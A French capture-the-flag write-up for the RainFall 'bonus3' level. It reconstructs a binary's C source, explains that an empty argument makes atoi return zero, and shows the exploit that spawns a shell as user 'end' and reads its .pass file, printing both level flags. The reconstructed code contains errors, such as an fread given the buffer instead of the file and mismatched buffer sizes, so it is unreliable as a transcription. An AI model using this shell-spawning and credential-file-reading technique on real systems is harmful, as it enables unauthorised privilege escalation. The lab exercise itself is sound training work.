# Bonus3

pass : `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`

## Sources :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int		main(int ac, char **av) {
	FILE	*file;  // exp+0x9c
	char	str[65];  // esp+0x18
	int		nb;  // esp+0x59

	file = fopen("/home/user/end/.pass", "r");
	bzero(str, 33);
	if (!file)
		return 255;
	if (ac != 2)
		return 255;

	fread(str, 1, 66, file);  // 0x42
	nb = 0;
	str[atoi(av[1])] = 0;
	fread(str+66, 1, 65, str);  // 0x41
	fclose(file);

	if (strcmp(str, av[1]) == 0) {
		execl("/bin/sh", "sh", 0);
	} else {
		puts(str + 66);
	}
	return 0;
}
```

## Recherche :

On voit que le programme fait une comparaison entre `str` et `av[1]`, le plus simple pour que les deux soit égales, est que les deux soient nulles.

Pour que `str` soit nulle, il suffit que lorsqu'on fait `str[atoi(av[1])] = 0;` on ait `atoi(av[1]) == 0`.

`atoi("0") == 0`, mais aussi `atoi("") == 0`

Comme on attend forcément un argument au lieu d'appeler `./bonus2`, on va faire `./bonus3 ""`

## Exploit :

```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cd ../end
$ cat .pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
